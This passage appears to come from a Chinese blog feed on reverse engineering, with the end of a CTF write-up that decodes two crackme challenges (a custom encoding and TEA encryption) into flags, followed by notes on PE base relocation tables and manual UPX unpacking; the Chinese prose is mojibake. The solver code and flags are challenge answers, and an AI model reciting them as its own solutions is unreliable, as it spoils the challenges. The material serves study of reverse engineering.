class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x62</span>, <span class="number">0x6A</span>, </span><br><span class="line">       <span class="number">0x6B</span>, <span class="number">0x30</span>, <span class="number">0x75</span>, <span class="number">0x6A</span>, <span class="number">0x71</span>, <span class="number">0x31</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, </span><br><span class="line">       <span class="number">0x72</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x30</span>, <span class="number">0x71</span>, <span class="number">0x62</span>, <span class="number">0x71</span>, <span class="number">0x62</span>, </span><br><span class="line">       <span class="number">0x6B</span>, <span class="number">0x31</span>, <span class="number">0x41</span>, <span class="number">0x41</span>] <span class="comment">#60ä¸ªå€¼</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">up</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(fox)):</span><br><span class="line">        <span class="keyword">if</span> (fox[i] == x):</span><br><span class="line">            <span class="keyword">return</span> i </span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,<span class="number">60</span>,<span class="number">2</span>):</span><br><span class="line">    t = up(sng[i])+((up(sng[i+<span class="number">1</span>]))&lt;&lt;<span class="number">3</span>)</span><br><span class="line">    flag += <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;Y0u_know_B@se_very_we11&#125;</span></span><br></pre></td></tr></table></figure><p>ç®—æ³•ï¼Œcè¯­è¨€</p><hr><h2 id="find-flag">find_flag</h2><p>å…ˆçœ‹ä¸€ä¸‹ç¨‹åºï¼šå‘ç°ä¼šè¾“å…¥ä¸¤æ¬¡flagï¼Œä¸çŸ¥é“ä»€ä¹ˆç”¨æ„</p><p>è¿˜æ˜¯ç”¨idaæ‰“å¼€ï¼Œåœ¨åˆ¤æ–­å‡½æ•°ä¹‹å‰çœ‹åˆ°äº†åŠ å¯†å‡½æ•°æ ¹æ®1640531527å¯çŸ¥è¿™æ˜¯ä¸€ä¸ªTAEåŠ å¯†ï¼Œä½†æ˜¯ç”±äºçŸ¥é“æœ‰è¾“å…¥äº†ä¸¤ä¸ªflagå…ˆçœ‹çœ‹ä¹‹å‰çš„flag1æ€ä¹ˆæ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_401AB0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !strnum )</span><br><span class="line">  &#123;</span><br><span class="line">    strnum = <span class="number">1</span>;</span><br><span class="line">    check1();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">check1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (**pfunc)(<span class="type">void</span>); <span class="comment">// rbx</span></span><br><span class="line">  __int64 *v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; bigq[i + <span class="number">1</span>]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i )</span><br><span class="line">  &#123;</span><br><span class="line">    pfunc = (<span class="type">void</span> (**)(<span class="type">void</span>))&amp;bigq[i];</span><br><span class="line">    v1 = &amp;bigq[i - (<span class="type">unsigned</span> __int64)(i - <span class="number">1</span>) - <span class="number">1</span>];<span class="comment">//å°±æ˜¯é¦–å…ƒç´ </span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      (*pfunc--)();</span><br><span class="line">    <span class="keyword">while</span> ( pfunc != (<span class="type">void</span> (**)(<span class="type">void</span>))v1 );</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401510((<span class="type">int</span> (__cdecl *)())sub_401A00);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°check1ä¸­æœ‰ä¸€ä¸ªæŒ‡å‘å‡½æ•°æŒ‡é’ˆçš„æŒ‡é’ˆè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘äº†bigqçš„åœ°å€ï¼Œè€Œæ‰“å¼€å¯ä»¥çœ‹åˆ°bigqçš„åœ°å€åé¢è·Ÿç€ä¸¤ä¸ªå‡½æ•°çš„åœ°å€ï¼Œæ‰€ä»¥å½“pfuncè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘è¿™ä¸ªåœ°å€çš„æ—¶å€™ï¼Œå®ƒè§£å¼•ç”¨å°±æ˜¯è¿™ä¸ªå‡½æ•°åœ°å€åœ¨(*pfuncâ€“)();å¤„è°ƒç”¨å¹¶å‡å°ï¼Œå¯ä»¥æŠŠbigqå½“ä½œä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ•°ç»„</p><p>æ³¨æ„foråé¢æœ‰;æ‰€ä»¥åªå¢åŠ äº†iï¼Œåé¢ä¸åœ¨å¾ªç¯é‡Œï¼Œæ‰€ä»¥ç›¸å½“äºä»åå‘å‰æ‰§è¡Œé‚£ä¸¤ä¸ªå‡½æ•°,é‚£ä¹ˆå…ˆçœ‹é‚£ä¸¤ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªè°ƒç”¨çš„å‡½æ•°(è¿™ä¸ªæ˜¯func2)æ˜¯ä¸€ä¸ªé€€å‡ºå‡½æ•°ï¼Ÿï¼Ÿæš‚æ—¶ä¸ç®¡ã€‚</p><p>æ‰“å¼€func1ï¼š</p><p>çœ‹åˆ°å¾ˆå¤šæ•°ç»„,åœ¨è¯»å–æ—¶åŠ¨æ€è°ƒè¯•ä¸‹æ–­ç‚¹,å‘ç°è¿™é‡Œæ˜¯çœŸçš„æ£€æŸ¥å¤„</p><p>çœŸçš„æ£€æŸ¥å‡½æ•°æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">4</span>; ++k )</span><br><span class="line">    sub_401550(&amp;flag1[<span class="number">2</span> * k]);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(flag1, &amp;v3[<span class="number">3</span>], <span class="number">0x28</span>ui64) )</span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_401550</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> e; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> b2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> b1; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  b1 = *a1;</span><br><span class="line">  b2 = a1[<span class="number">1</span>];</span><br><span class="line">  e = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    e -= <span class="number">1640531527</span>;</span><br><span class="line">    b1 += (b2 + e) ^ (<span class="number">16</span> * b2 + <span class="number">137</span>) ^ ((b2 &gt;&gt; <span class="number">5</span>) + <span class="number">118</span>);</span><br><span class="line">    b2 += (b1 + e) ^ (<span class="number">16</span> * b1 + <span class="number">84</span>) ^ ((b1 &gt;&gt; <span class="number">5</span>) + <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = b1;</span><br><span class="line">  a1[<span class="number">1</span>] = b2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯ä¸€ä¸ªTEA</p><p>æ³¨æ„æ­¤å¤„è¯»å–å‰40ä¸ªå€¼ä¸”å–testæ•°ç»„çš„ç¬¬å››ä½å¼€å§‹,è€Œflagæ˜¯charç±»å‹,åé¢è½¬æˆunintç±»å‹,é‰´äºä¸å¥½pythonå’Œcå¤§æ•°è®¡ç®—æœ‰å·®åˆ«,æ‰€ä»¥ç”¨cå†™:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b2; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b1; </span><br><span class="line">    b1 = *a;</span><br><span class="line">    b2 = a[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        e -= <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0x1f</span>; ++i) &#123;</span><br><span class="line">        b2 -= (b1 + e) ^ (<span class="number">16</span> * b1 + <span class="number">84</span>) ^ ((b1 &gt;&gt; <span class="number">5</span>) + <span class="number">50</span>);</span><br><span class="line">        b1 -= (b2 + e) ^ (<span class="number">16</span> * b2 + <span class="number">137</span>) ^ ((b2 &gt;&gt; <span class="number">5</span>) + <span class="number">118</span>);</span><br><span class="line">        e += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *a = b1;</span><br><span class="line">    a[<span class="number">1</span>] = b2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> data[<span class="number">10</span>] = &#123;</span><br><span class="line">    <span class="number">0x9F1F796B</span>, <span class="number">0xE4AF7378</span>, <span class="number">0x72FCDFD5</span>, <span class="number">0x4A57FFE0</span>, <span class="number">0x1672BA07</span>, <span class="number">0xAA057BE6</span>, <span class="number">0x9E171F8E</span>, <span class="number">0xDD153E4F</span>,</span><br><span class="line">    <span class="number">0x41079E59</span>, <span class="number">0x807578DD</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">5</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        dec(&amp;data[k*<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%#X&quot;</span>, data[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//0X67616C660X7730577B0X756F59210X6E31465F0X456D5F640X6F635F210X4072674E0X416C75740X6E6F31740X7D2173</span></span><br></pre></td></tr></table></figure><p>ç„¶åå­—ç¬¦ä¸²è½¬æ¢:</p><p>666C61677B57307721596F755F46316E645F6D45215F636F4E67724074756C4174316F6E73217D</p><p>è½¬string:flag{W0w!You_F1nd_mE!_coNgr@tulAt1ons!}</p><p>cè¯­è¨€ï¼Œå‡½æ•°æŒ‡é’ˆæ•°ç»„å’ŒæŒ‡å‘å‡½æ•°æŒ‡é’ˆæ•°ç»„çš„æŒ‡é’ˆï¼ŒTEA</p><h1>æ€»ç»“</h1><h2 id="RC4åŠ å¯†">RC4åŠ å¯†</h2><p>è¯¦è§ä¸“æ ï¼š<a href="ed8aa7e2.html">RC4</a></p><h2 id="TAEåŠ å¯†">TAEåŠ å¯†</h2><p>è¯¦è§ä¸“æ ï¼š<a href="d89283b5.html">TEA</a></p><h2 id="å®‰å“è°ƒè¯•æµç¨‹">å®‰å“è°ƒè¯•æµç¨‹</h2><blockquote><p>å‰ç½®æµç¨‹ï¼š</p><ol><li>å…ˆä¸‹è½½adbï¼ˆéƒ¨åˆ†æ¨¡æ‹Ÿå™¨è‡ªå¸¦adbï¼Œåœ¨æ¨¡æ‹Ÿå™¨æ ¹ç›®å½•ï¼‰</li><li>æ‰“å¼€æ¨¡æ‹Ÿå™¨çš„rootå’Œå¼€å‘è€…æ¨¡å¼ï¼Œåœ¨å¼€å‘è€…æ¨¡å¼é‡Œé¢å¼€usbè°ƒè¯•</li></ol><p>ç„¶åï¼š</p><ol><li>ç”¨adbè¿æ¥æ¨¡æ‹Ÿå™¨ï¼šadb connect 127.0.0.1ï¼šxxxxxï¼ˆxxxxxæ ¹æ®æ¨¡æ‹Ÿå™¨è€Œå®šï¼‰ï¼Œä¸è¦å…³é—­</li><li>æ‰“å¼€jadxçš„debugåŠŸèƒ½ï¼Œé¡¶ä¸Šçš„<img src="https://s2.loli.net/2023/12/17/KGJzYeBwxroNOgR.png" alt="image-20231210140413425" style="zoom:33%;" />ï¼Œç„¶ååº”è¯¥èƒ½çœ‹åˆ°ä¸‹é¢çš„è®¾å¤‡å‡ºç°äº†å„ç§çº¿ç¨‹</li><li>æ‰¾åˆ°å¯¹åº”è¿›ç¨‹ï¼Œå¼€å§‹è°ƒè¯•</li></ol></blockquote><h2 id="CEçš„monoåŠŸèƒ½">CEçš„monoåŠŸèƒ½</h2><p>monoæ˜¯Novellå¼€å‘çš„è·¨å¹³å°.NETè¿è¡Œç¯å¢ƒ,è€ŒCsharpæ˜¯è¿™ä¸ªç¯å¢ƒä¸Šçš„ä¸»è¦ç¼–ç¨‹è¯­è¨€ï¼ŒUnityçš„ä½¿ç”¨çš„å°±æ˜¯Csharp,æ‰€ä»¥CEçš„monoåŠŸèƒ½å¯ä»¥å¯¹å¤§éƒ¨åˆ†unityæ¸¸æˆä½¿ç”¨</p><p>å¼€å¯monoåï¼ŒCtrl+Dæ‰“å¼€åæ±‡ç¼–ç¨‹åºçª—å£åå¯ä»¥ç›´æ¥çœ‹åˆ°ç±»åå’Œå‡½æ•°åï¼Œä¹Ÿå¯ä»¥åœ¨monoçª—å£æŸ¥çœ‹DLLå†…å®¹ï¼Œç›¸åº”ç±»å’Œæ–¹æ³•ï¼Œå˜é‡ç­‰ï¼Œä¸ä»…å¯ä»¥æ–¹ä¾¿å†™CEluaè„šæœ¬è¿˜èƒ½æ–¹ä¾¿åç¼–è¯‘å™¨lispyæˆ–dnspyæ‰¾DLLå’Œæ–¹æ³•å</p>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ‚é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†æ ¸ã€‹04-åŸºå€é‡å®šä½è¡¨</title>
      <link href="/posts/8430b536.html"/>
      <url>/posts/8430b536.html</url>
      
        <content type="html"><![CDATA[<h1>åŸºå€é‡å®šä½è¡¨</h1><h2 id="å®šä¹‰">å®šä¹‰</h2><p>PEé‡å®šä½æŒ‡å¦‚æœPEæ–‡ä»¶åŠ è½½æ—¶(ä¸€èˆ¬æ˜¯DLL,SYSåŠ¨æ€åŠ è½½)å·²ç»æœ‰åˆ«çš„DLLæˆ–SYSæ–‡ä»¶åŠ è½½åˆ°å®ƒçš„ImageBaseå¤„ï¼ŒPEè£…è½½å™¨ä¼šå°†å…¶åŠ è½½åˆ°å…¶å®ƒæœªè¢«å ç”¨çš„ç©ºé—´ã€‚<strong>PEè£…è½½å™¨æŠŠå®ƒè£…è½½åˆ°å…¶å®ƒä½ç½®çš„ä¸€ç³»åˆ—è¡Œä¸º</strong>å°±å«åšPEé‡å®šä½ã€‚(å¦‚æœä¸è¿›è¡Œè¿™ä¸ªæ“ä½œ,ç¨‹åºæ— æ³•è¿è¡Œ,å†…å­˜åœ°å€å¼•ç”¨é”™è¯¯)</p><blockquote><p>è¦è§£å†³ä»€ä¹ˆé—®é¢˜å‘¢?<br>â€“å³è®©DLLæ–‡ä»¶èƒ½åŠ è½½åˆ°å…¶å®ƒåœ°æ–¹å¹¶å¯ä»¥è¢«æ­£ç¡®è°ƒç”¨.</p></blockquote><p>å¯¹äºexeæ–‡ä»¶æ¥è¯´,exeæ¯æ¬¡éƒ½ä¼šåŠ è½½åˆ°éšæœºåœ°å€(ASLRæœºåˆ¶)</p><h2 id="æ“ä½œåŸç†">æ“ä½œåŸç†</h2><ul><li>åœ¨ç¨‹åºä¸­æŸ¥æ‰¾ç¡¬ç¼–ç çš„åœ°å€ä½ç½®(å¦‚æŒ‡ä»¤æŒ‡å‘çš„ç»å¯¹åœ°å€)</li><li>è¯»å–å€¼å,å‡å»imagebase(VA-&gt;RVA)</li><li>åŠ ä¸Šå®é™…åŠ è½½çš„åœ°å€(RVA-&gt;VA)</li><li>æ³¨:è¿™ä¸ªæ˜¯åœ¨åŠ è½½æ—¶ç›´æ¥å†™å…¥ä¿®æ”¹,è€Œä¸æ˜¯æ¯æ¬¡è°ƒç”¨å‡½æ•°æˆ–æŒ‡ä»¤æ—¶å†è®¡ç®—</li></ul><p>é‚£ä¹ˆ,è¯¥å¦‚ä½•æŸ¥æ‰¾ç¡¬ç¼–ç åœ°å€å‘¢?</p><h2 id="åŸºå€é‡å®šä½è¡¨">åŸºå€é‡å®šä½è¡¨</h2><p>åŸºå€é‡å®šä½è¡¨è®°å½•äº†ç¨‹åºåŠ è½½æ—¶éœ€è¦ä¿®æ­£çš„å€¼çš„ç›¸å…³ä¿¡æ¯,åŒ…æ‹¬ä¿®æ­£åœ°å€çš„ä½ç½®,éœ€è¦ä¿®æ­£çš„å­—èŠ‚æ•°,éœ€è¦ä¿®æ­£çš„åœ°å€ç±»å‹ç­‰.åœ¨.relocèŠ‚ä¸­.ä½äºPEå¤´çš„DataDirectoryæ•°ç»„çš„ç´¢å¼•ä¸º5çš„å…ƒç´ æŒ‡å‘äº†è¿™ä¸ªè¡¨.è¯¥è¡¨ä¸­æ¯ä¸ªè®°å½•éƒ½è¢«ç§°ä¸º<strong>ä¸€é¡¹</strong>(entry),æ¯ä¸ªé¡¹åŒ…å«äº†éœ€è¦ä¿®æ­£çš„åœ°å€çš„è¯¦ç»†ä¿¡æ¯.é¡¹ä»¥å¯å˜é•¿åº¦æ•°ç»„çš„å½¢å¼å­˜åœ¨<strong>é‡å®šä½å—</strong>ä¸­,æ¯ä¸ªé‡å®šä½å—æ˜¯å¦‚ä¸‹çš„IMAGE_BASE_RELOCATIONç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD VirtualAddress; <span class="comment">// éœ€è¦é‡å®šä½çš„æ•°æ®çš„RVA</span></span><br><span class="line">    DWORD SizeOfBlock;    <span class="comment">// é‡å®šä½å—çš„é•¿åº¦(åŒ…æ‹¬TypeOffset)</span></span><br><span class="line">    <span class="comment">//WORD TypeOffset[1];   // é‡å®šä½çš„åç§»</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD Offset:<span class="number">12</span>;  <span class="comment">// å¤§å°ä¸º12Bitçš„é‡å®šä½åç§» </span></span><br><span class="line">    WORD Type  :<span class="number">4</span>;   <span class="comment">// å¤§å°ä¸º4Bitçš„é‡å®šä½ä¿¡æ¯ç±»å‹å€¼ </span></span><br><span class="line">&#125;TypeOffset;         <span class="comment">// è¿™ä¸ªç»“æ„ä½“æ˜¯A1Passæ€»ç»“çš„</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¯ä¸ªIMAGE_BASE_RELOCATIONç»“æ„ä½“éƒ½è¡¨ç¤ºä¸€ä¸ªé‡å®šä½å—,æ¯å—è®°å½•äº†0x1000é¡µ,è®°å½•æ–¹æ³•æ˜¯VirtualAddressè¡¨æ˜åŸºåœ°å€,æ¯ä¸ªTypeOffsetçš„ä½12ä½è¡¨ç¤ºåç§»,åŸºåœ°å€åŠ åç§»å³æ˜¯é‚£ä¸ªéœ€è¦ä¿®æ”¹çš„åœ°å€.</p><p>å…¶ä¸­SizeOfBlockçš„å¤§å°(å—çš„é•¿åº¦)æŒ‡æ˜è¯¥é‡å®šä½å—ä¸­é‡å®šä½é¡¹çš„ä¸ªæ•°</p><p>TypeOffsetåŸåˆ™ä¸Šä¸å±äºç»“æ„ä¸­,ä¸”å…ƒç´ ä¸ªæ•° = ï¼ˆSizeOfBlock - 8 ï¼‰/ 2,å…¶ä¸­å‰4ä½çš„éƒ¨åˆ†å«ä¹‰:</p><blockquote><ul><li>[<code>IMAGE_REL_BASED_ABSOLUTE (0)</code>ï¼šä½¿å—æŒ‰ç…§32ä½å¯¹é½ï¼Œä½ç½®ä¸º0]</li><li>[<code>IMAGE_REL_BASED_HIGH (1)</code>ï¼šé«˜16ä½å¿…é¡»åº”ç”¨äºåç§»é‡æ‰€æŒ‡é«˜å­—16ä½]</li><li>[<code>IMAGE_REL_BASED_LOW (2)</code>ï¼šä½16ä½å¿…é¡»åº”ç”¨äºåç§»é‡æ‰€æŒ‡ä½å­—16ä½]</li><li>[<code>IMAGE_REL_BASED_HIGHLOW (3)</code>ï¼šå…¨éƒ¨32ä½åº”ç”¨äºæ‰€æœ‰32ä½]</li><li>[<code>IMAGE_REL_BASED_HIGHADJ (4)</code>ï¼šéœ€è¦32ä½ï¼Œé«˜16ä½ä½äºåç§»é‡ï¼Œä½16ä½ä½äºä¸‹ä¸€ä¸ªåç§»é‡æ•°ç»„å…ƒç´ ï¼Œç»„åˆä¸ºä¸€ä¸ªå¸¦ç¬¦å·æ•°ï¼ŒåŠ ä¸Š32ä½çš„ä¸€ä¸ªæ•°ï¼Œç„¶ååŠ ä¸Š8000ç„¶åæŠŠé«˜16ä½ä¿å­˜åœ¨åç§»é‡çš„16ä½åŸŸå†…]ã€‚</li></ul></blockquote><p>æ•°ç»„çš„æœ€åä¸€é¡¹ä»¥NULLå¡«å……ç»“å°¾.</p>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† </category>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†æ ¸ã€‹03-æ‰‹è„±UPX</title>
      <link href="/posts/d011918c.html"/>
      <url>/posts/d011918c.html</url>
      
        <content type="html"><![CDATA[<blockquote><h2 id="UPXè§£ç æ­¥éª¤">UPXè§£ç æ­¥éª¤</h2><blockquote><p>1.å…ˆåˆå§‹åŒ–<br>2.è¿›è¡Œä»£ç è¿˜åŸ<br>3.è¿›è¡ŒCALLä¿®å¤<br>4.è¿›è¡Œå‡½æ•°è¡¨è¿˜åŸ<br>5.èŠ‚è¡¨åˆå§‹åŒ–<br>6.è§£ç å®Œæ¯•é£å‘ç¨‹åºå…¥å£</p></blockquote></blockquote><h2 id="æ–¹æ³•">æ–¹æ³•</h2><ul><li>å•æ­¥è·Ÿè¸ªæ³•</li><li>ESPå®šå¾‹æ³•</li></ul><h2 id="è§£é‡Š">è§£é‡Š</h2><p>å•æ­¥è·Ÿè¸ªæ³•ï¼šåŸºäºUPXè§£å‹ç¼©çš„æ­¥éª¤ï¼Œepå¼€å¤´ä¼šå…ˆpushæ‰€æœ‰å¯„å­˜å™¨åˆ°æ ˆï¼Œç„¶åæ‰§è¡Œä¸‰ä¸ªå¾ªç¯ï¼ˆè§å‰ä¸€èŠ‚ï¼‰ï¼Œç„¶åpopå¼¹å‡ºæ‰€æœ‰å¯„å­˜å™¨åï¼Œé‡å»ºè¡¨ï¼Œè¿›å…¥ç¨‹åºoepã€‚å› æ­¤ï¼Œåªè¦ä¸€ç›´f8ï¼Œé‡åˆ°å¾ªç¯å°±f4è·³è¿‡ï¼Œç›´åˆ°çœ‹åˆ°popï¼Œç„¶åè·³è¿‡å°å¾ªç¯ï¼Œè¿›å…¥æœ€åä¸€ä¸ªå°±ï¼Œjmpå³å¯è¿›å…¥oepï¼ŒåŸºäºä»¥ä¸ŠåŸç†ï¼Œç”±äºupxè§£å‹éƒ¨åˆ†å’Œè·³è½¬éƒ½æ˜¯è¿åœ¨ä¸€èµ·çš„ï¼Œæ‰€ä»¥ç›´æ¥alt+tæœç´¢popæŒ‡ä»¤æ‰¾åˆ°æœ€åçš„ä½ç½®(pushå¯¹åº”pop,pushaæˆ–pushadå¯¹åº”popaå’Œpopad)</p><p>ESPå®šå¾‹æ³•ï¼šæ ¹æ®åŸç†pushä¹‹åæ˜¯è§£å‹ï¼Œè§£å‹å®Œä¸ºäº†è·³å›oepè¦è·å¾—ä¹‹å‰çš„å¯„å­˜å™¨å€¼å³æ ˆä¸€å®šä¼šå¹³è¡¡ï¼Œå¼€å§‹æ—¶çš„æ ˆå’Œæœ€åè¿›å…¥oepçš„æ ˆçŠ¶æ€ç›¸åŒï¼Œå› æ­¤å¼€å§‹è°ƒè¯•åå…ˆf8ï¼Œä½¿ESP(RSP)ä¸‹æµ®ä¸€ä¸ªå€¼åˆ›å»ºæ ˆ,å¦‚æœä¹‹åçš„æŒ‡ä»¤éœ€è¦è¿™æ—¶æ ˆåº•çš„å¯„å­˜å™¨å€¼,ä¸€å®šä¼šå›åˆ°è¿™é‡Œè¯»å–è¿™ä¸ªå€¼.ç„¶åå¤åˆ¶è¿™æ—¶æ ˆé¡¶çš„åœ°å€,Gè·³åˆ°é‚£ä¸ªåœ°å€,åœ¨è¿™é‡Œä¸‹ç¡¬ä»¶æ–­ç‚¹,ç‚¹f9åè¿è¡Œåˆ°ç¡¬ä»¶æ–­ç‚¹å°±æ˜¯popçš„ä½ç½®ä¹‹åçš„æŒ‡ä»¤,ç„¶åå¦‚ä¸Šå³å¯.</p><h2 id="å®ä¾‹">å®ä¾‹</h2><h3 id="å®ä¾‹ä¸€-ä½¿ç”¨IDA">å®ä¾‹ä¸€(ä½¿ç”¨IDA)</h3><p>1,è„±ä¸€ä¸ªx64ç¨‹åºçš„UPXå£³,ä½¿ç”¨ida:</p><p>åˆå§‹å¯¹æ¯”:</p><img src="https://s2.loli.net/2023/12/13/rxZo9yn2kcEePSq.png" alt="a" /><p>å¯ä»¥çœ‹å‡ºåŠ å£³ä¹‹åæ¯”æºç¨‹åºå°äº†çº¦å››åˆ†ä¹‹ä¸‰.ç”¨idaæ‰“å¼€åŠ å£³ç¨‹åº:</p><img 